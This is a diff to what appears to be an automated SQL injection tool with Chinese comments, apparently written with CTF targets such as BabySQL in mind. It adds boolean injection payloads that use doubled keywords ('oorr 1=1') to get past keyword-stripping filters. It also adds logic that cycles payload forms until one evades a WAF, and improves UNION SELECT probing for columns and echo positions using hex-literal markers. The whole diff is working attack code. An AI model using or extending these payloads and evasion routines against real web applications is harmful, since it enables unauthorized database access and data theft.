@@ -14,6 +14,7 @@ from ..tampers import apply_form
 MARKER_PREFIX = "asq"          # 回显位标记前缀，尽量避开常见词
 
 # (形态名, 恒真核心, 恒假核心)——and 适用查询框，or 适用登录框（恒真=登录成功）
+# orinject：关键字被 str_replace 剥离的环境（BabySQL），oorr 双写还原
 BOOL_FORMS = [
     ("classic", " and 1=1", " and 1=2"),
     ("paren",   "and(1=1)", "and(1=2)"),
@@ -23,6 +24,8 @@ BOOL_FORMS = [
     ("inline",  "/**/or/**/1=1", "/**/or/**/1=2"),
     ("tab",     "\tand\t1=1", "\tand\t1=2"),
     ("tab",     "\tor\t1=1", "\tor\t1=2"),
+    ("orinject", "oorr 1=1", "oorr 1=2"),
+    ("orinject", "aornd 1=1", "aornd 1=2"),
 ]
 
 
@@ -65,11 +68,33 @@ class Detector:
                 return None
         inj.form = self.form
 
+        # form 升级：classic 失效（关键字剥离/空格过滤）时按多形态重找可用恒真
+        # （报错法命中闭合的场景 form 仍是 classic，WAF 剥离下 and/or 全灭）
+        self._upgrade_form(inj)
+        inj.form = self.form
+
         comment = self._probe_comment(inj)
         inj.comment = comment
         self._probe_bool(inj)
         self._probe_columns(inj)
         return inj
+
+    def _upgrade_form(self, inj: InjectionPoint):
+        """验证当前 form 是否有真假差异；没有则遍历 BOOL_FORMS 升级。"""
+        pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
+        for form, t_core, f_core in BOOL_FORMS:
+            t = self._send(f"{pre}{t_core}#")
+            f = self._send(f"{pre}{f_core}#")
+            if t.status_code < 0 or f.status_code < 0:
+                continue
+            if self._differs(t, f) and \
+                    (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
+                if form != inj.form:
+                    self.log("INFO", f"形态升级: {inj.form} → {form}"
+                                     f"（{t_core.strip()[:10]} 真假差异确认）")
+                    inj.comment = "#"
+                self.form = form
+                return
 
     # ------------------------------------------------------------------ closure
     def _probe_closure(self) -> Optional[str]:
@@ -108,8 +133,8 @@ class Detector:
     def _probe_numeric(self) -> bool:
         """数字型判定：and 1=1 / and 1=2 页面差异（多形态，空格被滤时用 inline/paren/tab）。"""
         for form, t_core, f_core in BOOL_FORMS:
-            if "or" in t_core:      # 数字型判定用 and 语义（真=基线）
-                continue
+            if t_core.lstrip().lower().startswith(("or", "oorr")):
+                continue    # 数字型判定用 and 语义（真=基线）
             t = self._send(f"{self.s.spec.base_value}{t_core}#")
             f = self._send(f"{self.s.spec.base_value}{f_core}#")
             if t.status_code < 0 or f.status_code < 0:
@@ -231,7 +256,8 @@ class Detector:
                     cols = ",".join(to_hex_literal(m) for m in markers)
                 payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
                 r = self._send(payload)
-                if r.status_code > 0:
+                # 报错页会把 payload 原文回显在 near '...' 中，必须排除
+                if r.status_code > 0 and not r.has_sql_error():
                     pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
                     if pos:
                         inj.column_count = n
@@ -241,11 +267,18 @@ class Detector:
                         return
 
     def _find_echo_positions(self, inj: InjectionPoint):
+        from ..tampers import to_hex_literal
         markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(inj.column_count)]
-        cols = ",".join(f"'{m}'" for m in markers)
-        r = self._send(f"0{inj.closure} union select {cols}{inj.comment}")
-        if r.status_code > 0:
-            pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
-            if pos:
-                inj.echo_positions = pos
-                self.log("INFO", f"回显位: 第 {pos} 列")
+        for lit in ("quote", "hex"):
+            if lit == "quote":
+                cols = ",".join(f"'{m}'" for m in markers)
+            else:
+                cols = ",".join(to_hex_literal(m) for m in markers)
+            r = self._send(f"0{inj.closure} union select {cols}{inj.comment}")
+            # 报错页会把 payload 原文回显在 near '...' 中，必须排除
+            if r.status_code > 0 and not r.has_sql_error():
+                pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
+                if pos:
+                    inj.echo_positions = pos
+                    self.log("INFO", f"回显位: 第 {pos} 列（marker={lit}）")
+                    return
